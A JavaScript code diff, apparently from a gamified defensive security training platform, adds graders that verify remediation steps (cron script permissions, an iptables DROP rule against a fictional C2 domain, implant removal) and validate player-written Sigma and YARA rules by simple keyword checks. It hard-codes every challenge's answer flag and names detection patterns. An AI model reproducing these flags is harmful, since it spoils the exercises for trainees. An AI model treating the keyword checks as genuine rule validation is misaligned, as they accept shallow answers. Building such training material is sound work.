+      const perm = String(cronNode.permissions || '0777');
+      const isWorldWritable = perm.endsWith('7') || perm.endsWith('6') || perm === '0777' || perm === '777';
+      if (isWorldWritable) {
+        return {
+          success: false,
+          verified: false,
+          hardened: false,
+          message: `Échec du durcissement : /opt/maintenance/aegis-backup.sh possède des permissions permissives (${perm}). Exécute "chmod 0700 /opt/maintenance/aegis-backup.sh" dans le terminal.`
+        };
+      }
+      const flag = 'REMEDIATION{CRON_PERMISSIONS_HARDENED_0700}';
+      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        verified: true,
+        hardened: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 60,
+        message: '✔ Permissions restreintes à 0700 sur le script de maintenance et chaîne de persistance neutralisée !'
+      };
+    } else if (challengeId === 'aegis-box-03-vault') {
+      const iptablesNode = findNode('/etc/iptables.rules');
+      const dropperNode = findNode('/opt/telemetry/shadow_dropper');
+      const hasFirewallDrop = iptablesNode && typeof iptablesNode.content === 'string' && iptablesNode.content.toUpperCase().includes('DROP');
+      const isDropperRemoved = !dropperNode || (dropperNode.content && !dropperNode.content.includes('CHIMERA_IMPLANT'));
+      if (!hasFirewallDrop || !isDropperRemoved) {
+        return {
+          success: false,
+          verified: false,
+          hardened: false,
+          message: 'Échec de neutralisation : le flux C2 vers beacon-alpha.chimera-apt.net n\'est pas bloqué dans /etc/iptables.rules (règle DROP requise) ou l\'implant est encore actif.'
+        };
+      }
+      const flag = 'REMEDIATION{SHADOW_DROPPER_NEUTRALIZED_AND_ISOLATED}';
+      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        verified: true,
+        hardened: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 80,
+        message: '✔ Implant Chimera purgé du disque et flux d\'exfiltration bloqué par pare-feu ! Félicitations pour la Saison 1.'
+      };
+    }
+
+    return {
+      success: false,
+      verified: false,
+      hardened: false,
+      message: 'Challenge inconnu pour vérification de remédiation.'
+    };
+  }
+
+  // 8.4 Validation de Règle de Détection (Sigma / YARA)
+  validateSocRule(challengeId, ruleType, ruleContent = '', playerId = 'current_player') {
+    const text = (ruleContent || '').toLowerCase().trim();
+    if (!text || text.length < 15) {
+      return {
+        success: false,
+        valid: false,
+        message: 'Contenu de règle trop court ou vide. Rédige une règle complète de détection.'
+      };
+    }
+
+    if (challengeId === 'aegis-box-01-perimeter') {
+      const hasStructure = text.includes('detection:') && text.includes('condition:') && (text.includes('logsource:') || text.includes('title:') || text.includes('selection:'));
+      const hasTarget = text.includes('aegis-sync');
+      if (!hasStructure) {
+        return {
+          success: false,
+          valid: false,
+          message: 'Syntaxe Sigma invalide : les sections "detection:" et "condition:" sont obligatoires.'
+        };
+      }
+      if (!hasTarget) {
+        return {
+          success: false,
+          valid: false,
+          message: 'La règle Sigma doit cibler le binaire suspect "/usr/local/bin/aegis-sync".'
+        };
+      }
+      const flag = 'SIGMA{AEGIS_SYNC_SUID_ABUSE_DETECTED}';
+      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        valid: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 25,
+        message: '✔ Règle Sigma validée ! L\'exécution anormale d\'aegis-sync est désormais détectée par le SIEM.'
+      };
+    } else if (challengeId === 'aegis-box-02-internal') {
+      const hasStructure = text.includes('detection:') && text.includes('condition:') && (text.includes('logsource:') || text.includes('title:') || text.includes('selection:'));
+      const hasTarget = text.includes('aegis-backup') || text.includes('/opt/maintenance') || text.includes('cron');
+      if (!hasStructure) {
+        return {
+          success: false,
+          valid: false,
+          message: 'Syntaxe Sigma invalide : les sections "detection:" et "condition:" sont obligatoires.'
+        };
+      }
+      if (!hasTarget) {
+        return {
+          success: false,
+          valid: false,
+          message: 'La règle Sigma doit surveiller les modifications dans /opt/maintenance/ ou les scripts cron.'
+        };
+      }
+      const flag = 'SIGMA{CRON_PERSISTENCE_TAMPERING_DETECTED}';
+      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        valid: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 50,
+        message: '✔ Règle Sigma validée ! L\'altération de scripts de maintenance planifiés est détectée.'
+      };
+    } else if (challengeId === 'aegis-box-03-vault') {
+      const hasStructure = (text.includes('rule ') || text.startsWith('rule')) && text.includes('condition:') && text.includes('strings:');
+      const hasTarget = text.includes('chimera_implant_v1') || text.includes('beacon-alpha') || text.includes('shadowdropper');
+      if (!hasStructure) {
+        return {
+          success: false,
+          valid: false,
+          message: 'Syntaxe YARA invalide : la règle doit définir un bloc "rule", des "strings:" et une "condition:".'
+        };
+      }
+      if (!hasTarget) {
+        return {
+          success: false,
+          valid: false,
+          message: 'La règle YARA doit inclure le motif d\'implant "CHIMERA_IMPLANT_V1" ou le domaine C2 "beacon-alpha.chimera-apt.net".'
+        };
+      }
+      const flag = 'YARA{CHIMERA_SHADOWDROPPER_SIGNATURE_VALIDATED}';
+      const sub = this.submitFlag(challengeId, 't5', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        valid: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 70,
+        message: '✔ Signature YARA validée ! L\'implant Chimera-ShadowDropper est neutralisé par le scanner.'
+      };
+    }
+
+    return {
+      success: false,
+      valid: false,
+      message: 'Challenge inconnu pour validation de règle SOC.'
+    };
   }
 
   // 9. Déblocage d'indice avec coût en gemmes
